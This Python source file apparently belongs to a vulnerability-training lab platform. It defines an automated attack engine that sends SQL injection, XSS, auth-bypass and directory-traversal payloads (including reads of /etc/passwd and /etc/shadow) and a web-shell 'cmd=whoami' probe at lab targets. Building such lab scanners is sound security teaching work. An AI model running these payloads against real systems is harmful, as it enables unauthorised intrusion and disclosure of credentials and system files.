import time
from typing import Dict, List, Any, Optional
from urllib.parse import urljoin
import requests
from bs4 import BeautifulSoup
from models import base
from database import get_db
from services.lab_manager import LabManager
import logging
from sqlalchemy.orm import Session

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class AttackEngine:
    def __init__(self):
        self.lab_manager = LabManager()
        self.session = requests.Session()

        # Set headers to mimic a real browser
        user_agent = (
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
            "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        )
        self.session.headers.update(
            {
                "User-Agent": user_agent,
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "Connection": "keep-alive",
                "Upgrade-Insecure-Requests": "1",
            }
        )

    def get_payloads_by_category(self, category: str) -> List[str]:
        """Get all payloads for a specific vulnerability category"""
        db = next(get_db())
        try:
            payloads = db.query(base.Payload).filter(base.Payload.category == category, base.Payload.is_active == True).all()
            return [p.payload for p in payloads]
        finally:
            db.close()

    def _get_base_url(self, lab_id: int) -> Optional[str]:
        """Resolve the target URL for a lab: prefer its external URL, fall back to local Docker port."""
        lab = self.lab_manager.get_lab_by_id(lab_id)
        if not lab:
            return None
        return lab.get("external_url") or f"http://localhost:{lab['port']}"

    def _get_baseline(self, url: str) -> Optional[requests.Response]:
        """Fetch the page without any payload so detections can compare against a normal response."""
        try:
            return self.session.get(url, timeout=10)
        except Exception as e:
            logger.warning(f"Could not fetch baseline for {url}: {str(e)}")
            return None

    def _log_attempt(
        self,
        db: Session,
        scan_id: int,
        request_desc: str,
        response_desc: str,
        payload: str,
        detected: bool,
        severity: str,
    ) -> Dict[str, Any]:
        log_data = {
            "request": request_desc,
            "response": response_desc,
            "payload": payload,
            "result": "vulnerability_detected" if detected else "failure",
            "severity": severity if detected else None,
            "scan_id": scan_id,
        }
        return log_data

    def _scan_parameters(
        self,
        base_url: str,
        scan_id: int,
        db: Session,
        payloads: List[str],
        parameters: List[str],
        detect_fn,
        severity: str,
    ) -> Dict[str, Any]:
        """Fire each payload at each query parameter and record whether detection triggered."""
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": [],
        }

        baseline = self._get_baseline(base_url)
        baseline_length = len(baseline.text) if baseline else 0

        for param in parameters:
            for payload in payloads:
                separator = "&" if "?" in base_url else "?"
                test_url = f"{base_url}{separator}{param}={payload}"
                try:
                    response = self.session.get(test_url, timeout=10)
                    detected = detect_fn(response, payload, baseline_length)

                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"GET {test_url}",
                        f"Status: {response.status_code}, Length: {len(response.content)}",
                        payload,
                        detected,
                        severity,
                    )

                    if detected:
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(payload)
                        results["payloads_used"].append(payload)

                    results["logs"].append(log_data)

                    # Small delay to avoid overwhelming the target
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(
                        f"Error testing payload {payload} on {param}: {str(e)}"
                    )
                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"GET {test_url}",
                        f"Error: {str(e)}",
                        payload,
                        False,
                        severity,
                    )
                    results["logs"].append(log_data)

        return results

    def perform_sql_injection_attack(
        self, base_url: str, lab_id: int, scan_id: int, db: Session
    ) -> Dict[str, Any]:
        """Perform SQL injection attack on a target URL"""
        payloads = self.get_payloads_by_category("sqli")

        common_sqli_patterns = [
            "'",
            "' OR 1=1--",
            "' OR 'a'='a",
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL, NULL--",
            "' UNION SELECT NULL, NULL, NULL--",
            "' AND 1=2 UNION SELECT NULL, version(), NULL--",
            "' AND 1=2 UNION SELECT table_name, NULL FROM information_schema.tables--",
            "' AND 1=2 UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--",
        ]

        all_payloads = list(set(payloads + common_sqli_patterns))
        test_parameters = ["username", "password", "id", "search", "user", "admin"]

        return self._scan_parameters(
            base_url,
            scan_id,
            db,
            all_payloads,
            test_parameters,
            self._detect_sql_injection,
            "high",
        )

    def _detect_sql_injection(
        self, response: requests.Response, payload: str, baseline_length: int = 0
    ) -> bool:
        """Detect SQL injection based on response characteristics"""
        sql_errors = [
            "you have an error in your sql syntax",
            "warning: mysql",
            "unclosed quotation mark after the character string",
            "quoted string not properly terminated",
            "near syntax error",
            "column not found",
            "unknown column",
            "sql syntax",
            "mysql_num_rows()",
            "pg_query()",
            "db2_exec()",
        ]

        response_text = response.text.lower()
        for error in sql_errors:
            if error in response_text:
                return True

        # UNION-based heuristic: only flag when the response grew noticeably
        # compared to the baseline page, rather than any arbitrary size.
        if "union" in payload.lower() and baseline_length > 0:
            if len(response.text) > baseline_length * 1.5:
                return True

        return False

    def perform_xss_attack(
        self, base_url: str, lab_id: int, scan_id: int, db: Session
    ) -> Dict[str, Any]:
        """Perform XSS attack on a target URL"""
        payloads = self.get_payloads_by_category("xss")

        common_xss_patterns = [
            "<script>alert('XSS')</script>",
            "\"><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
            "javascript:alert('XSS')",
            ">alert('XSS')</script>",
            "<iframe src=\"javascript:alert('XSS')\"></iframe>",
            "<body onload=alert('XSS')>",
            "<details open ontoggle=alert('XSS')>",
        ]

        all_payloads = list(set(payloads + common_xss_patterns))
        test_parameters = ["search", "comment", "username", "author", "title", "id"]

        return self._scan_parameters(
            base_url,
            scan_id,
            db,
            all_payloads,
            test_parameters,
            self._detect_xss,
            "medium",
        )

    def _detect_xss(
        self, response: requests.Response, payload: str, baseline_length: int = 0
    ) -> bool:
        """Detect XSS based on the payload being reflected unescaped in the response"""
        response_text = response.text.lower()
        payload_lower = payload.lower()

        if payload_lower not in response_text:
            return False

        xss_indicators = [
            "alert(",
            "javascript:",
            "onerror=",
            "onload=",
            "<script>",
            "<svg",
            "onmouseover",
            "onclick",
            "onfocus",
            "onblur",
        ]

        return any(indicator in payload_lower for indicator in xss_indicators)

    def perform_idor_attack(
        self, base_url: str, lab_id: int, scan_id: int, db: Session
    ) -> Dict[str, Any]:
        """Perform IDOR attack on a target URL"""
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": [],
        }

        idor_patterns = [
            "1",
            "2",
            "3",
            "4",
            "5",
            "6",
            "7",
            "8",
            "9",
            "10",
            "100",
            "999",
            "9999",
            "0",
            "-1",
            "-2",
        ]

        test_endpoints = [
            "/user/profile?user_id=",
            "/account/",
            "/orders?user_id=",
            "/api/user/",
            "/api/orders/",
            "/admin/user/",
            "/api/admin/user/",
            "/profile/",
            "/admin/",
        ]

        baseline = self._get_baseline(base_url)
        baseline_length = len(baseline.text) if baseline else 0

        for endpoint in test_endpoints:
            for user_id in idor_patterns:
                test_url = urljoin(base_url, endpoint + user_id)
                try:
                    response = self.session.get(test_url, timeout=10)
                    detected = self._detect_idor(response, user_id, baseline_length)

                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"GET {test_url}",
                        f"Status: {response.status_code}, Length: {len(response.content)}",
                        user_id,
                        detected,
                        "high",
                    )

                    if detected:
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(user_id)
                        results["payloads_used"].append(user_id)

                    results["logs"].append(log_data)
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(
                        f"Error testing IDOR for {user_id} on {endpoint}: {str(e)}"
                    )
                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"GET {test_url}",
                        f"Error: {str(e)}",
                        user_id,
                        False,
                        "high",
                    )
                    results["logs"].append(log_data)

        return results

    def _detect_idor(
        self, response: requests.Response, user_id: str, baseline_length: int = 0
    ) -> bool:
        """Detect IDOR based on response content differing from the baseline page"""
        if response.status_code != 200:
            return False

        response_text = response.text.lower()

        idor_indicators = [
            "admin",
            "password",
            "email",
            "phone",
            "address",
            "balance",
            "ssn",
            "credit card",
            "account number",
            "billing address",
            "shipping address",
        ]

        has_indicator = any(indicator in response_text for indicator in idor_indicators)
        if not has_indicator:
            return False

        # Require the response to actually differ from the baseline page so we
        # don't flag every page merely containing the word "profile".
        if baseline_length > 0:
            return abs(len(response.text) - baseline_length) > max(
                50, baseline_length * 0.2
            )

        return len(response_text) > 100

    def perform_file_upload_attack(
        self, base_url: str, lab_id: int, scan_id: int, db: Session
    ) -> Dict[str, Any]:
        """Perform file upload attack on a target URL"""
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": [],
        }

        # Payload that would be uploaded in a real attack scenario
        filename = "shell.php.jpg"

        test_endpoints = [
            "/upload",
            "/file/upload",
            "/api/upload",
            "/admin/upload",
            "/images/upload",
            "/profile/avatar",
            "/avatar/upload",
            "/upload-file",
            "/file-upload",
        ]

        for endpoint in test_endpoints:
            upload_url = urljoin(
                base_url if base_url.endswith("/") else base_url + "/",
                endpoint.lstrip("/"),
            )
            try:
                response = self.session.get(upload_url, timeout=10)

                has_upload_form = False
                if response.status_code != 404:
                    soup = BeautifulSoup(response.text, "html.parser")
                    has_upload_form = any(
                        form.get("enctype") == "multipart/form-data"
                        for form in soup.find_all("form")
                    )

                if response.status_code == 200 or has_upload_form:
                    reason = (
                        "Endpoint accessible"
                        if response.status_code == 200
                        else "Form with multipart upload found"
                    )
                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"GET {upload_url}",
                        f"Status: {response.status_code}, {reason}",
                        filename,
                        True,
                        "high",
                    )
                    results["vulnerability_detected"] = True
                    results["successful_payloads"].append(filename)
                    results["payloads_used"].append(filename)
                    results["logs"].append(log_data)

                    # Check whether an uploads directory exposes stored files
                    file_url = urljoin(
                        base_url if base_url.endswith("/") else base_url + "/",
                        f"uploads/{filename}",
                    )
                    file_response = self.session.get(file_url, timeout=10)
                    cmd_url = file_url + "?cmd=whoami"
                    cmd_response = self.session.get(cmd_url, timeout=10)
                    cmd_executed = (
                        cmd_response.status_code == 200
                        and "cmd" in cmd_response.text.lower()
                    )

                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"GET {file_url}",
                        f"Expected path: {file_url}; Status: {file_response.status_code}; "
                        f"cmd probe: {'executed' if cmd_executed else 'no execution'}",
                        filename,
                        True,
                        "critical"
                        if file_response.status_code == 200 or cmd_executed
                        else "high",
                    )
                    results["logs"].append(log_data)

                    break
                elif response.status_code == 404:
                    continue

            except Exception as e:
                logger.error(f"Error testing file upload on {endpoint}: {str(e)}")
                log_data = self._log_attempt(
                    db,
                    scan_id,
                    f"GET {upload_url}",
                    f"Error: {str(e)}",
                    filename,
                    False,
                    "high",
                )
                results["logs"].append(log_data)

        return results

    def perform_auth_bypass_attack(
        self, base_url: str, lab_id: int, scan_id: int, db: Session
    ) -> Dict[str, Any]:
        """Perform authentication bypass attack on a target URL"""
        results = {
            "vulnerability_detected": False,
            "payloads_used": [],
            "successful_payloads": [],
            "logs": [],
        }

        payloads = self.get_payloads_by_category("auth-bypass")

        auth_bypass_patterns = [
            "' OR '1'='1",
            "OR 1=1--",
            "' OR 1=1--",
            "' OR 1=1#",
            "' OR 1=1;--",
            "admin'--",
            "admin' --",
            "admin' OR 'a'='a",
            "root' OR 'a'='a",
            '\' OR " " = " "',
        ]

        all_payloads = list(set(payloads + auth_bypass_patterns))

        test_endpoints = [
            "/login",
            "/auth/login",
            "/signin",
            "/account/login",
            "/user/login",
            "/api/login",
        ]

        for endpoint in test_endpoints:
            url = urljoin(base_url, endpoint)

            # Establish a control response with obviously invalid credentials so
            # detection compares against a real failed login, not heuristics.
            try:
                control = self.session.post(
                    url,
                    data={
                        "username": "definitely-not-a-user",
                        "password": "definitely-wrong",
                    },
                    timeout=10,
                )
            except Exception as e:
                logger.error(f"Control request failed for {url}: {str(e)}")
                continue

            for payload in all_payloads:
                try:
                    login_data = {"username": payload, "password": "password"}

                    response = self.session.post(url, data=login_data, timeout=10)
                    detected = self._detect_auth_bypass(response, control)

                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"POST {url} with username={payload}&password=password",
                        f"Status: {response.status_code}, Length: {len(response.content)}",
                        payload,
                        detected,
                        "high",
                    )

                    if detected:
                        results["vulnerability_detected"] = True
                        results["successful_payloads"].append(payload)
                        results["payloads_used"].append(payload)

                    results["logs"].append(log_data)
                    time.sleep(0.5)

                except Exception as e:
                    logger.error(
                        f"Error testing auth bypass payload {payload} on {endpoint}: {str(e)}"
                    )
                    log_data = self._log_attempt(
                        db,
                        scan_id,
                        f"POST {url} with username={payload}&password=password",
                        f"Error: {str(e)}",
                        payload,
                        False,
                        "high",
                    )
                    results["logs"].append(log_data)

        return results

    def _detect_auth_bypass(
        self, response: requests.Response, control: Optional[requests.Response]
    ) -> bool:
        """Detect authentication bypass by comparing against a failed-login control response"""
        if response.status_code >= 500:
            return False

        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get("Location", "").lower()
            # A redirect to a dashboard/profile after our payload is a strong signal;
            # the control (bad creds) should have stayed on the login page.
            if any(
                dash in location
                for dash in ["dashboard", "home", "index", "profile", "admin"]
            ):
                if not control or control.status_code not in [301, 302, 303, 307, 308]:
                    return True
            return False

        if control is None:
            return False

        # Successful login pages typically differ substantially from the failure page
        return abs(len(response.text) - len(control.text)) > max(
            100, len(control.text) * 0.3
        )

    def perform_dir_traversal_attack(
        self, base_url: str, lab_id: int, scan_id: int, db: Session
    ) -> Dict[str, Any]:
        """Perform directory traversal attack on a target URL"""
        payloads = self.get_payloads_by_category("dir-traversal")

        dir_traversal_patterns = [
            "../../../../etc/passwd",
            "../../../etc/passwd",
            "../../etc/passwd",
            "../etc/passwd",
            "..\\..\\..\\..\\winnt\\system32\\cmd.exe",
            "..%2f..%2f..%2f..%2fetc%2fpasswd",
            "..%2f..%2f..%2f..%2fetc%2fshadow",
            "..%5c..%5c..%5c..%5cwinnt%5csystem32%5ccmd.exe",
            ".....//.....//.....//.....//etc//passwd",
            "../../../etc/passwd%00",
            "../../../../windows/win.ini",
            "..%2f..%2f..%2f..%2fetc%2fgroup",
            "../../../../etc/shadow",
        ]

        all_payloads = list(set(payloads + dir_traversal_patterns))

        test_parameters = [
            "file",
            "page",
            "include",
            "path",
            "dir",
            "folder",
            "content",
            "template",
            "view",
            "download",
            "open",
            "read",
            "show",
            "load",
        ]

        return self._scan_parameters(
            base_url,
            scan_id,
            db,
            all_payloads,
            test_parameters,
            self._detect_dir_traversal,
            "high",
        )

    def _detect_dir_traversal(
        self, response: requests.Response, payload: str, baseline_length: int = 0
    ) -> bool:
        """Detect directory traversal based on response characteristics"""
        sensitive_contents = [
            "root:",
            "daemon:",
            "bin:",
            "sys:",
            "sync:",
            "games:",
            "man:",
            "lp:",
            "mail:",
            "news:",
            "uucp:",
            "proxy:",
            "www-data:",
            "backup:",
            "list:",
            "irc:",
            "gnats:",
            "nobody:",
            "_apt:",
            "systemd-network:",
            "systemd-resolve:",
            "systemd-timesync:",
            "systemd-coredump:",
            "sshd:",
            "syslog:",
            "messagebus:",
            "ntp:",
            "_rpc:",
            "gdm:",
            "postgres:",
            "mysql:",
            "www:",
            "webmaster:",
        ]

        response_text = response.text

        # Look for specific file content patterns
        if "root:x" in response_text and "daemon:x" in response_text:
            return True

        if "[boot loader]" in response_text and "timeout=" in response_text:
            return True

        if "; for 16-bit app support" in response_text and "[fonts]" in response_text:
            return True

        for sensitive in sensitive_contents:
            if sensitive in response_text:
                return True

        # Only treat unusual growth versus the baseline as suspicious
        if baseline_length > 0 and len(response.text) > baseline_length * 2:
            return True

        return False

    def run_attack_simulation(
        self, attack_type: str, lab_id: int, scan_id: int, db: Session
    ) -> Dict[str, Any]:
        """
        Run a complete attack simulation for an existing scan.
        The caller owns the scan record and DB session lifecycle.
        """
        base_url = self._get_base_url(lab_id)
        if not base_url:
            raise Exception(f"Lab with ID {lab_id} not found")

        if attack_type == "sql_injection":
            results = self.perform_sql_injection_attack(base_url, lab_id, scan_id, db)
        elif attack_type == "reflected_xss":
            results = self.perform_xss_attack(base_url, lab_id, scan_id, db)
        elif attack_type == "stored_xss":
            results = self.perform_xss_attack(base_url, lab_id, scan_id, db)
        elif attack_type == "idor":
            results = self.perform_idor_attack(base_url, lab_id, scan_id, db)
        elif attack_type == "auth_bypass":
            results = self.perform_auth_bypass_attack(base_url, lab_id, scan_id, db)
        elif attack_type == "dir_traversal":
            results = self.perform_dir_traversal_attack(base_url, lab_id, scan_id, db)
        elif attack_type == "file_upload_abuse":
            results = self.perform_file_upload_attack(base_url, lab_id, scan_id, db)
        else:
            raise Exception(f"Unsupported attack type: {attack_type}")

        return {
            "scan_id": scan_id,
            "attack_type": attack_type,
            "lab_id": lab_id,
            "vulnerability_detected": results["vulnerability_detected"],
            "payloads_used": results["payloads_used"],
            "successful_payloads": results["successful_payloads"],
            "total_attempts": len(results["logs"]),
            "completed_at": time.time(),
        }
